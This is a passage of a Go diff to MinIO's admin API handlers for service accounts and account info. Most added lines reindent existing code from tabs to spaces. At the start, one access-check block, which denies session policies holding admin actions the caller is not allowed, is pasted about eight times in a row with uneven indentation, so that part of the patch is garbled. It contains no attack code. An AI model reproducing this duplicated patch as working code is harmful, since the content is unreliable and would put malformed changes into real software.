!globalIAMSys.IsAllowed(policy.Args{\n+AccountName:     cred.AccessKey,\n+Groups:          cred.Groups,\n+Action:          policy.Action(action),\n+ConditionValues: getConditionValues(r, \"\", cred),\n+IsOwner:         owner,\n+Claims:          cred.Claims,\n+}) {\n+writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+return\n+}\n+}\n+}\n+}\n+}\n+\n+\n+if sp != nil {\n+for _, st := range sp.Statements {\n+for action := range st.Actions {\n+if policy.Action(action).IsAdminAction() {\n+if !globalIAMSys.IsAllowed(policy.Args{\n+AccountName:     cred.AccessKey,\n+Groups:          cred.Groups,\n+Action:          policy.Action(action),\n+ConditionValues: getConditionValues(r, \"\", cred),\n+IsOwner:         owner,\n+Claims:          cred.Claims,\n+}) {\n+writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+return\n+}\n+}\n+}\n+}\n+}\n+\n+\n+if sp != nil {\n+for _, st := range sp.Statements {\n+for action := range st.Actions {\n+if policy.Action(action).IsAdminAction() {\n+if !globalIAMSys.IsAllowed(policy.Args{\n+AccountName:     cred.AccessKey,\n+Groups:          cred.Groups,\n+Action:          policy.Action(action),\n+ConditionValues: getConditionValues(r, \"\", cred),\n+IsOwner:         owner,\n+Claims:          cred.Claims,\n+}) {\n+writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+return\n+}\n+}\n+}\n+}\n+}\n+\n+\n+if sp != nil {\n+for _, st := range sp.Statements {\n+for action := range st.Actions {\n+if policy.Action(action).IsAdminAction() {\n+if !globalIAMSys.IsAllowed(policy.Args{\n+AccountName:     cred.AccessKey,\n+Groups:          cred.Groups,\n+Action:          policy.Action(action),\n+ConditionValues: getConditionValues(r, \"\", cred),\n+IsOwner:         owner,\n+Claims:          cred.Claims,\n+}) {\n+writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+return\n+}\n+}\n+}\n+}\n+}\n+\n+\n+\n+if sp != nil {\n+for _, st := range sp.Statements {\n+for action := range st.Actions {\n+if policy.Action(action).IsAdminAction() {\n+if !globalIAMSys.IsAllowed(policy.Args{\n+AccountName:     cred.AccessKey,\n+Groups:          cred.Groups,\n+Action:          policy.Action(action),\n+ConditionValues: getConditionValues(r, \"\", cred),\n+IsOwner:         owner,\n+Claims:          cred.Claims,\n+}) {\n+writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+return\n+}\n+}\n+}\n+}\n+}\n+\n+\n+\n+if sp != nil {\n+for _, st := range sp.Statements {\n+for action := range st.Actions {\n+if policy.Action(action).IsAdminAction() {\n+if !globalIAMSys.IsAllowed(policy.Args{\n+AccountName:     cred.AccessKey,\n+Groups:          cred.Groups,\n+Action:          policy.Action(action),\n+ConditionValues: getConditionValues(r, \"\", cred),\n+IsOwner:         owner,\n+Claims:          cred.Claims,\n+}) {\n+writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+return\n+}\n+}\n+}\n+}\n+}\n+\n+\n+        if sp != nil {\n+        for _, st := range sp.Statements {\n+        for action := range st.Actions {\n+        if policy.Action(action).IsAdminAction() {\n+        if !globalIAMSys.IsAllowed(policy.Args{\n+        AccountName:     cred.AccessKey,\n+        Groups:          cred.Groups,\n+        Action:          policy.Action(action),\n+        ConditionValues: getConditionValues(r, \"\", cred),\n+        IsOwner:         owner,\n+        Claims:          cred.Claims,\n+        }) {\n+        writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+        return\n+        }\n+        }\n+        }\n+        }\n+        }\n+\n+\n+\n+if sp != nil {\n+for _, st := range sp.Statements {\n+for action := range st.Actions {\n+if policy.Action(action).IsAdminAction() {\n+if !globalIAMSys.IsAllowed(policy.Args{\n+AccountName:     cred.AccessKey,\n+Groups:          cred.Groups,\n+Action:          policy.Action(action),\n+ConditionValues: getConditionValues(r, \"\", cred),\n+IsOwner:         owner,\n+Claims:          cred.Claims,\n+}) {\n+writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+return\n+}\n+}\n+}\n+}\n+}\n+\n+\n+        opts := updateServiceAccountOpts{\n+                secretKey:     updateReq.NewSecretKey,\n+                status:        updateReq.NewStatus,\n+                name:          updateReq.NewName,\n+                description:   updateReq.NewDescription,\n+                expiration:    updateReq.NewExpiration,\n+                sessionPolicy: sp,\n+        }\n+        updatedAt, err := globalIAMSys.UpdateServiceAccount(ctx, accessKey, opts)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        // Call site replication hook - non-root user accounts are replicated.\n+        if svcAccount.ParentUser != globalActiveCred.AccessKey {\n+                logger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n+                        Type: madmin.SRIAMItemSvcAcc,\n+                        SvcAccChange: &madmin.SRSvcAccChange{\n+                                Update: &madmin.SRSvcAccUpdate{\n+                                        AccessKey:     accessKey,\n+                                        SecretKey:     opts.secretKey,\n+                                        Status:        opts.status,\n+                                        Name:          opts.name,\n+                                        Description:   opts.description,\n+                                        SessionPolicy: updateReq.NewPolicy,\n+                                        Expiration:    updateReq.NewExpiration,\n+                                },\n+                        },\n+                        UpdatedAt: updatedAt,\n+                }))\n+        }\n+\n+        writeSuccessNoContent(w)\n }\n \n // InfoServiceAccount - GET /minio/admin/v3/info-service-account\n func (a adminAPIHandlers) InfoServiceAccount(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\t// Get current object layer instance.\n-\tobjectAPI := newObjectLayerFn()\n-\tif objectAPI == nil || globalNotificationSys == nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n-\t\treturn\n-\t}\n-\n-\tcred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n-\tif s3Err != ErrNone {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n-\t\treturn\n-\t}\n-\n-\taccessKey := mux.Vars(r)[\"accessKey\"]\n-\tif accessKey == \"\" {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n-\t\treturn\n-\t}\n-\n-\tsvcAccount, sessionPolicy, err := globalIAMSys.GetServiceAccount(ctx, accessKey)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tif !globalIAMSys.IsAllowed(policy.Args{\n-\t\tAccountName:     cred.AccessKey,\n-\t\tGroups:          cred.Groups,\n-\t\tAction:          policy.ListServiceAccountsAdminAction,\n-\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\tIsOwner:         owner,\n-\t\tClaims:          cred.Claims,\n-\t}) {\n-\t\trequestUser := cred.AccessKey\n-\t\tif cred.ParentUser != \"\" {\n-\t\t\trequestUser = cred.ParentUser\n-\t\t}\n-\n-\t\tif requestUser != svcAccount.ParentUser {\n-\t\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\t// if session policy is nil or empty, then it is implied policy\n-\timpliedPolicy := sessionPolicy == nil || (sessionPolicy.Version == \"\" && len(sessionPolicy.Statements) == 0)\n-\n-\tvar svcAccountPolicy policy.Policy\n-\n-\tif !impliedPolicy {\n-\t\tsvcAccountPolicy = *sessionPolicy\n-\t} else {\n-\t\tpoliciesNames, err := globalIAMSys.PolicyDBGet(svcAccount.ParentUser, svcAccount.Groups...)\n-\t\tif err != nil {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\tsvcAccountPolicy = globalIAMSys.GetCombinedPolicy(policiesNames...)\n-\t}\n-\n-\tpolicyJSON, err := json.MarshalIndent(svcAccountPolicy, \"\", \" \")\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tvar expiration *time.Time\n-\tif !svcAccount.Expiration.IsZero() && !svcAccount.Expiration.Equal(timeSentinel) {\n-\t\texpiration = &svcAccount.Expiration\n-\t}\n-\n-\tinfoResp := madmin.InfoServiceAccountResp{\n-\t\tParentUser:    svcAccount.ParentUser,\n-\t\tName:          svcAccount.Name,\n-\t\tDescription:   svcAccount.Description,\n-\t\tAccountStatus: svcAccount.Status,\n-\t\tImpliedPolicy: impliedPolicy,\n-\t\tPolicy:        string(policyJSON),\n-\t\tExpiration:    expiration,\n-\t}\n-\n-\tdata, err := json.Marshal(infoResp)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tencryptedData, err := madmin.EncryptData(cred.SecretKey, data)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\twriteSuccessResponseJSON(w, encryptedData)\n+        ctx := r.Context()\n+\n+        // Get current object layer instance.\n+        objectAPI := newObjectLayerFn()\n+        if objectAPI == nil || globalNotificationSys == nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n+                return\n+        }\n+\n+        cred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n+        if s3Err != ErrNone {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n+                return\n+        }\n+\n+        accessKey := mux.Vars(r)[\"accessKey\"]\n+        if accessKey == \"\" {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n+                return\n+        }\n+\n+        svcAccount, sessionPolicy, err := globalIAMSys.GetServiceAccount(ctx, accessKey)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        if !globalIAMSys.IsAllowed(policy.Args{\n+                AccountName:     cred.AccessKey,\n+                Groups:          cred.Groups,\n+                Action:          policy.ListServiceAccountsAdminAction,\n+                ConditionValues: getConditionValues(r, \"\", cred),\n+                IsOwner:         owner,\n+                Claims:          cred.Claims,\n+        }) {\n+                requestUser := cred.AccessKey\n+                if cred.ParentUser != \"\" {\n+                        requestUser = cred.ParentUser\n+                }\n+\n+                if requestUser != svcAccount.ParentUser {\n+                        writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+                        return\n+                }\n+        }\n+\n+        // if session policy is nil or empty, then it is implied policy\n+        impliedPolicy := sessionPolicy == nil || (sessionPolicy.Version == \"\" && len(sessionPolicy.Statements) == 0)\n+\n+        var svcAccountPolicy policy.Policy\n+\n+        if !impliedPolicy {\n+                svcAccountPolicy = *sessionPolicy\n+        } else {\n+                policiesNames, err := globalIAMSys.PolicyDBGet(svcAccount.ParentUser, svcAccount.Groups...)\n+                if err != nil {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                        return\n+                }\n+                svcAccountPolicy = globalIAMSys.GetCombinedPolicy(policiesNames...)\n+        }\n+\n+        policyJSON, err := json.MarshalIndent(svcAccountPolicy, \"\", \" \")\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        var expiration *time.Time\n+        if !svcAccount.Expiration.IsZero() && !svcAccount.Expiration.Equal(timeSentinel) {\n+                expiration = &svcAccount.Expiration\n+        }\n+\n+        infoResp := madmin.InfoServiceAccountResp{\n+                ParentUser:    svcAccount.ParentUser,\n+                Name:          svcAccount.Name,\n+                Description:   svcAccount.Description,\n+                AccountStatus: svcAccount.Status,\n+                ImpliedPolicy: impliedPolicy,\n+                Policy:        string(policyJSON),\n+                Expiration:    expiration,\n+        }\n+\n+        data, err := json.Marshal(infoResp)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        encryptedData, err := madmin.EncryptData(cred.SecretKey, data)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        writeSuccessResponseJSON(w, encryptedData)\n }\n \n // ListServiceAccounts - GET /minio/admin/v3/list-service-accounts\n func (a adminAPIHandlers) ListServiceAccounts(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\t// Get current object layer instance.\n-\tobjectAPI := newObjectLayerFn()\n-\tif objectAPI == nil || globalNotificationSys == nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n-\t\treturn\n-\t}\n-\n-\tcred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n-\tif s3Err != ErrNone {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tvar targetAccount string\n-\n-\t// If listing is requested for a specific user (who is not the request\n-\t// sender), check that the user has permissions.\n-\tuser := r.Form.Get(\"user\")\n-\tif user != \"\" && user != cred.AccessKey {\n-\t\tif !globalIAMSys.IsAllowed(policy.Args{\n-\t\t\tAccountName:     cred.AccessKey,\n-\t\t\tGroups:          cred.Groups,\n-\t\t\tAction:          policy.ListServiceAccountsAdminAction,\n-\t\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\t\tIsOwner:         owner,\n-\t\t\tClaims:          cred.Claims,\n-\t\t}) {\n-\t\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\ttargetAccount = user\n-\t} else {\n-\t\ttargetAccount = cred.AccessKey\n-\t\tif cred.ParentUser != \"\" {\n-\t\t\ttargetAccount = cred.ParentUser\n-\t\t}\n-\t}\n-\n-\tserviceAccounts, err := globalIAMSys.ListServiceAccounts(ctx, targetAccount)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tvar serviceAccountList []madmin.ServiceAccountInfo\n-\n-\tfor _, svc := range serviceAccounts {\n-\t\texpiryTime := svc.Expiration\n-\t\tserviceAccountList = append(serviceAccountList, madmin.ServiceAccountInfo{\n-\t\t\tAccessKey:  svc.AccessKey,\n-\t\t\tExpiration: &expiryTime,\n-\t\t})\n-\t}\n-\n-\tlistResp := madmin.ListServiceAccountsResp{\n-\t\tAccounts: serviceAccountList,\n-\t}\n-\n-\tdata, err := json.Marshal(listResp)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tencryptedData, err := madmin.EncryptData(cred.SecretKey, data)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\twriteSuccessResponseJSON(w, encryptedData)\n+        ctx := r.Context()\n+\n+        // Get current object layer instance.\n+        objectAPI := newObjectLayerFn()\n+        if objectAPI == nil || globalNotificationSys == nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n+                return\n+        }\n+\n+        cred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n+        if s3Err != ErrNone {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n+                return\n+        }\n+\n+        var targetAccount string\n+\n+        // If listing is requested for a specific user (who is not the request\n+        // sender), check that the user has permissions.\n+        user := r.Form.Get(\"user\")\n+        if user != \"\" && user != cred.AccessKey {\n+                if !globalIAMSys.IsAllowed(policy.Args{\n+                        AccountName:     cred.AccessKey,\n+                        Groups:          cred.Groups,\n+                        Action:          policy.ListServiceAccountsAdminAction,\n+                        ConditionValues: getConditionValues(r, \"\", cred),\n+                        IsOwner:         owner,\n+                        Claims:          cred.Claims,\n+                }) {\n+                        writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+                        return\n+                }\n+                targetAccount = user\n+        } else {\n+                targetAccount = cred.AccessKey\n+                if cred.ParentUser != \"\" {\n+                        targetAccount = cred.ParentUser\n+                }\n+        }\n+\n+        serviceAccounts, err := globalIAMSys.ListServiceAccounts(ctx, targetAccount)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        var serviceAccountList []madmin.ServiceAccountInfo\n+\n+        for _, svc := range serviceAccounts {\n+                expiryTime := svc.Expiration\n+                serviceAccountList = append(serviceAccountList, madmin.ServiceAccountInfo{\n+                        AccessKey:  svc.AccessKey,\n+                        Expiration: &expiryTime,\n+                })\n+        }\n+\n+        listResp := madmin.ListServiceAccountsResp{\n+                Accounts: serviceAccountList,\n+        }\n+\n+        data, err := json.Marshal(listResp)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        encryptedData, err := madmin.EncryptData(cred.SecretKey, data)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        writeSuccessResponseJSON(w, encryptedData)\n }\n \n // DeleteServiceAccount - DELETE /minio/admin/v3/delete-service-account\n func (a adminAPIHandlers) DeleteServiceAccount(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\t// Get current object layer instance.\n-\tobjectAPI := newObjectLayerFn()\n-\tif objectAPI == nil || globalNotificationSys == nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n-\t\treturn\n-\t}\n-\n-\tcred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n-\tif s3Err != ErrNone {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tserviceAccount := mux.Vars(r)[\"accessKey\"]\n-\tif serviceAccount == \"\" {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminInvalidArgument), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// We do not care if service account is readable or not at this point,\n-\t// since this is a delete call we shall allow it to be deleted if possible.\n-\tsvcAccount, _, err := globalIAMSys.GetServiceAccount(ctx, serviceAccount)\n-\tif errors.Is(err, errNoSuchServiceAccount) {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminServiceAccountNotFound), r.URL)\n-\t\treturn\n-\t}\n-\n-\tadminPrivilege := globalIAMSys.IsAllowed(policy.Args{\n-\t\tAccountName:     cred.AccessKey,\n-\t\tGroups:          cred.Groups,\n-\t\tAction:          policy.RemoveServiceAccountAdminAction,\n-\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\tIsOwner:         owner,\n-\t\tClaims:          cred.Claims,\n-\t})\n-\n-\tif !adminPrivilege {\n-\t\tparentUser := cred.AccessKey\n-\t\tif cred.ParentUser != \"\" {\n-\t\t\tparentUser = cred.ParentUser\n-\t\t}\n-\t\tif svcAccount.ParentUser != \"\" && parentUser != svcAccount.ParentUser {\n-\t\t\t// The service account belongs to another user but return not\n-\t\t\t// found error to mitigate brute force attacks. or the\n-\t\t\t// serviceAccount doesn't exist.\n-\t\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminServiceAccountNotFound), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\tif err := globalIAMSys.DeleteServiceAccount(ctx, serviceAccount, true); err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Call site replication hook - non-root user accounts are replicated.\n-\tif svcAccount.ParentUser != \"\" && svcAccount.ParentUser != globalActiveCred.AccessKey {\n-\t\tlogger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n-\t\t\tType: madmin.SRIAMItemSvcAcc,\n-\t\t\tSvcAccChange: &madmin.SRSvcAccChange{\n-\t\t\t\tDelete: &madmin.SRSvcAccDelete{\n-\t\t\t\t\tAccessKey: serviceAccount,\n-\t\t\t\t},\n-\t\t\t},\n-\t\t\tUpdatedAt: UTCNow(),\n-\t\t}))\n-\t}\n-\n-\twriteSuccessNoContent(w)\n+        ctx := r.Context()\n+\n+        // Get current object layer instance.\n+        objectAPI := newObjectLayerFn()\n+        if objectAPI == nil || globalNotificationSys == nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n+                return\n+        }\n+\n+        cred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n+        if s3Err != ErrNone {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n+                return\n+        }\n+\n+        serviceAccount := mux.Vars(r)[\"accessKey\"]\n+        if serviceAccount == \"\" {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminInvalidArgument), r.URL)\n+                return\n+        }\n+\n+        // We do not care if service account is readable or not at this point,\n+        // since this is a delete call we shall allow it to be deleted if possible.\n+        svcAccount, _, err := globalIAMSys.GetServiceAccount(ctx, serviceAccount)\n+        if errors.Is(err, errNoSuchServiceAccount) {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminServiceAccountNotFound), r.URL)\n+                return\n+        }\n+\n+        adminPrivilege := globalIAMSys.IsAllowed(policy.Args{\n+                AccountName:     cred.AccessKey,\n+                Groups:          cred.Groups,\n+                Action:          policy.RemoveServiceAccountAdminAction,\n+                ConditionValues: getConditionValues(r, \"\", cred),\n+                IsOwner:         owner,\n+                Claims:          cred.Claims,\n+        })\n+\n+        if !adminPrivilege {\n+                parentUser := cred.AccessKey\n+                if cred.ParentUser != \"\" {\n+                        parentUser = cred.ParentUser\n+                }\n+                if svcAccount.ParentUser != \"\" && parentUser != svcAccount.ParentUser {\n+                        // The service account belongs to another user but return not\n+                        // found error to mitigate brute force attacks. or the\n+                        // serviceAccount doesn't exist.\n+                        writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminServiceAccountNotFound), r.URL)\n+                        return\n+                }\n+        }\n+\n+        if err := globalIAMSys.DeleteServiceAccount(ctx, serviceAccount, true); err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        // Call site replication hook - non-root user accounts are replicated.\n+        if svcAccount.ParentUser != \"\" && svcAccount.ParentUser != globalActiveCred.AccessKey {\n+                logger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n+                        Type: madmin.SRIAMItemSvcAcc,\n+                        SvcAccChange: &madmin.SRSvcAccChange{\n+                                Delete: &madmin.SRSvcAccDelete{\n+                                        AccessKey: serviceAccount,\n+                                },\n+                        },\n+                        UpdatedAt: UTCNow(),\n+                }))\n+        }\n+\n+        writeSuccessNoContent(w)\n }\n \n // AccountInfoHandler returns usage, permissions and other bucket metadata for incoming us\n func (a adminAPIHandlers) AccountInfoHandler(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\t// Get current object layer instance.\n-\tobjectAPI := newObjectLayerFn()\n-\tif objectAPI == nil || globalNotificationSys == nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n-\t\treturn\n-\t}\n-\n-\tcred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n-\tif s3Err != ErrNone {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Set prefix value for \"s3:prefix\" policy conditionals.\n-\tr.Header.Set(\"prefix\", \"\")\n-\n-\t// Set delimiter value for \"s3:delimiter\" policy conditionals.\n-\tr.Header.Set(\"delimiter\", SlashSeparator)\n-\n-\t// Check if we are asked to return prefix usage\n-\tenablePrefixUsage := r.Form.Get(\"prefix-usage\") == \"true\"\n-\n-\tisAllowedAccess := func(bucketName string) (rd, wr bool) {\n-\t\tif globalIAMSys.IsAllowed(policy.Args{\n-\t\t\tAccountName:     cred.AccessKey,\n-\t\t\tGroups:          cred.Groups,\n-\t\t\tAction:          policy.ListBucketAction,\n-\t\t\tBucketName:      bucketName,\n-\t\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\t\tIsOwner:         owner,\n-\t\t\tObjectName:      \"\",\n-\t\t\tClaims:          cred.Claims,\n-\t\t}) {\n-\t\t\trd = true\n-\t\t}\n-\n-\t\tif globalIAMSys.IsAllowed(policy.Args{\n-\t\t\tAccountName:     cred.AccessKey,\n-\t\t\tGroups:          cred.Groups,\n-\t\t\tAction:          policy.GetBucketLocationAction,\n-\t\t\tBucketName:      bucketName,\n-\t\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\t\tIsOwner:         owner,\n-\t\t\tObjectName:      \"\",\n-\t\t\tClaims:          cred.Claims,\n-\t\t}) {\n-\t\t\trd = true\n-\t\t}\n-\n-\t\tif globalIAMSys.IsAllowed(policy.Args{\n-\t\t\tAccountName:     cred.AccessKey,\n-\t\t\tGroups:          cred.Groups,\n-\t\t\tAction:          policy.PutObjectAction,\n-\t\t\tBucketName:      bucketName,\n-\t\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\t\tIsOwner:         owner,\n-\t\t\tObjectName:      \"\",\n-\t\t\tClaims:          cred.Claims,\n-\t\t}) {\n-\t\t\twr = true\n-\t\t}\n-\n-\t\treturn rd, wr\n-\t}\n-\n-\tbucketStorageCache.Once.Do(func() {\n-\t\t// Set this to 10 secs since its enough, as scanner\n-\t\t// does not update the bucket usage values frequently.\n-\t\tbucketStorageCache.TTL = 10 * time.Second\n-\n-\t\t// Rely on older value if usage loading fails from disk.\n-\t\tbucketStorageCache.Relax = true\n-\t\tbucketStorageCache.Update = func() (interface{}, error) {\n-\t\t\tctx, done := context.WithTimeout(context.Background(), 2*time.Second)\n-\t\t\tdefer done()\n-\n-\t\t\treturn loadDataUsageFromBackend(ctx, objectAPI)\n-\t\t}\n-\t})\n-\n-\tvar dataUsageInfo DataUsageInfo\n-\tv, _ := bucketStorageCache.Get()\n-\tif v != nil {\n-\t\tdataUsageInfo, _ = v.(DataUsageInfo)\n-\t}\n-\n-\t// If etcd, dns federation configured list buckets from etcd.\n-\tvar err error\n-\tvar buckets []BucketInfo\n-\tif globalDNSConfig != nil && globalBucketFederation {\n-\t\tdnsBuckets, err := globalDNSConfig.List()\n-\t\tif err != nil && !IsErrIgnored(err,\n-\t\t\tdns.ErrNoEntriesFound,\n-\t\t\tdns.ErrDomainMissing) {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\tfor _, dnsRecords := range dnsBuckets {\n-\t\t\tbuckets = append(buckets, BucketInfo{\n-\t\t\t\tName:    dnsRecords[0].Key,\n-\t\t\t\tCreated: dnsRecords[0].CreationDate,\n-\t\t\t})\n-\t\t}\n-\t\tsort.Slice(buckets, func(i, j int) bool {\n-\t\t\treturn buckets[i].Name < buckets[j].Name\n-\t\t})\n-\t} else {\n-\t\tbuckets, err = objectAPI.ListBuckets(ctx, BucketOptions{Cached: true})\n-\t\tif err != nil {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\taccountName := cred.AccessKey\n-\tif cred.IsTemp() || cred.IsServiceAccount() {\n-\t\t// For derived credentials, check the parent user's permissions.\n-\t\taccountName = cred.ParentUser\n-\t}\n-\n-\troleArn := policy.Args{Claims: cred.Claims}.GetRoleArn()\n-\tpolicySetFromClaims, hasPolicyClaim := policy.GetPoliciesFromClaims(cred.Claims, iamPolicyClaimNameOpenID())\n-\tvar effectivePolicy policy.Policy\n-\n-\tvar buf []byte\n-\tswitch {\n-\tcase accountName == globalActiveCred.AccessKey:\n-\t\tfor _, policy := range policy.DefaultPolicies {\n-\t\t\tif policy.Name == \"consoleAdmin\" {\n-\t\t\t\teffectivePolicy = policy.Definition\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t}\n-\n-\tcase roleArn != \"\":\n-\t\t_, policy, err := globalIAMSys.GetRolePolicy(roleArn)\n-\t\tif err != nil {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\tpolicySlice := newMappedPolicy(policy).toSlice()\n-\t\teffectivePolicy = globalIAMSys.GetCombinedPolicy(policySlice...)\n-\n-\tcase hasPolicyClaim:\n-\t\teffectivePolicy = globalIAMSys.GetCombinedPolicy(policySetFromClaims.ToSlice()...)\n-\n-\tdefault:\n-\t\tpolicies, err := globalIAMSys.PolicyDBGet(accountName, cred.Groups...)\n-\t\tif err != nil {\n-\t\t\tlogger.LogIf(ctx, err)\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), 